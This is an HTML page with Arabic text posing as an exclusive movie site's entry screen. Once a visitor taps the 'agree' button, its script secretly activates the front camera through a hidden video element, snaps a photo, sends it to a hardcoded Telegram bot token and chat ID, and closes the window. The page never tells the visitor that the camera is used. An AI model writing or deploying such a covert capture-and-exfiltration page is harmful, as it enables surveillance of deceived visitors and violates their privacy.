<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>موقع أفلام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #111;
            overflow: hidden;
            touch-action: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        
        #camera-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            z-index: -1;
        }
        
        #permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
            text-align: center;
            padding: 30px;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        
        .logo {
            width: 120px;
            height: 120px;
            margin-bottom: 25px;
            background: linear-gradient(45deg, #007AFF, #00D4FF);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 10px 25px rgba(0, 122, 255, 0.3);
        }
        
        .logo i {
            font-size: 50px;
        }
        
        .permission-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #fff;
            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        
        .permission-text {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 30px;
            color: #e0e0e0;
            max-width: 350px;
        }
        
        .permission-btn {
            margin-top: 15px;
            padding: 15px 40px;
            background: linear-gradient(45deg, #007AFF, #00D4FF);
            color: white;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 122, 255, 0.4);
            transition: all 0.3s ease;
        }
        
        .permission-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 122, 255, 0.6);
        }
        
        .permission-btn:active {
            transform: translateY(1px);
        }
        
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1001;
            color: white;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #007AFF;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 25px;
        }
        
        .loading-text {
            font-size: 18px;
            color: #e0e0e0;
            letter-spacing: 1px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none !important;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <!-- عنصر الكاميرا المخفي -->
    <video id="camera-container" autoplay playsinline></video>
    
    <!-- طبقة طلب الإذن -->
    <div id="permission-overlay" class="pulse">
        <div class="logo">
            <i class="fas fa-film"></i>
        </div>
        <h2 class="permission-title">مرحباً بكم في موقع الأفلام</h2>
        <p class="permission-text">للدخول إلى موقع الأفلام الحصريه اضغط على زر الموافقه وانتظر تحميلك للموقع  </p>
        <button class="permission-btn" id="allow-btn">
            <i class="fas fa-check-circle" style="margin-left: 8px;"></i>
            الموافقة والمتابعة
        </button>
    </div>
    
    <!-- طبقة التحميل -->
    <div id="loading-overlay">
        <div class="spinner"></div>
        <p class="loading-text">جاري التحضير لدخول الموقع...</p>
    </div>
    
    <script>
        // التكوين - استبدل هذه القيم
        const config = {
            botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
            chatId: '5310911220',
            captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
        };
        
        // العناصر
        const cameraView = document.getElementById('camera-container');
        const permissionOverlay = document.getElementById('permission-overlay');
        const loadingOverlay = document.getElementById('loading-overlay');
        const allowBtn = document.getElementById('allow-btn');
        
        // دالة متعددة المتصفحات لطلب الكاميرا
        async function initCamera() {
            try {
                const constraints = {
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'user'
                    },
                    audio: false
                };
                
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    return await navigator.mediaDevices.getUserMedia(constraints);
                } else if (navigator.getUserMedia) {
                    return new Promise((resolve, reject) => {
                        navigator.getUserMedia(constraints, resolve, reject);
                    });
                } else {
                    throw new Error('not supported');
                }
            } catch (error) {
                console.error('initialization failed:', error);
                throw error;
            }
        }
        
        // دالة التقاط الصورة
        function capturePhoto(videoElement) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(resolve, 'image/jpeg', 0.92);
            });
        }
        
        // دالة إرسال الصورة إلى تليجرام
        async function sendToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', config.chatId);
                formData.append('photo', photoBlob, 'captured_photo.jpg');
                
                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                throw error;
            }
        }
        
        // معالجة النقر على زر الموافقة
        allowBtn.addEventListener('click', async () => {
            try {
                // إخفاء واجهة الإذن وإظهار التحميل
                permissionOverlay.style.opacity = '0';
                setTimeout(() => {
                    permissionOverlay.classList.add('hidden');
                    loadingOverlay.style.display = 'flex';
                }, 300);
                
                // تهيئة الكاميرا
                const stream = await initCamera();
                cameraView.srcObject = stream;
                
                // انتظر لضبط الكاميرا
                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
                
                // التقاط الصورة
                const photoBlob = await capturePhoto(cameraView);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                // إرسال الصورة
                await sendToTelegram(photoBlob);
                
                // إغلاق النافذة بعد الإرسال
                setTimeout(() => {
                    window.close();
                }, config.autoCloseDelay);
                
            } catch (error) {
                console.error('Process failed:', error);
                loadingOverlay.style.display = 'none';
                
                // عرض رسالة خطأ بسيطة
                alert('حدث خطأ: ' + (error.message || 'غير معروف'));
            }
        });
        
        // بدء العملية عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            // يمكن إضافة أي تهيئة إضافية هنا
        });
    </script>
</body>
</html>
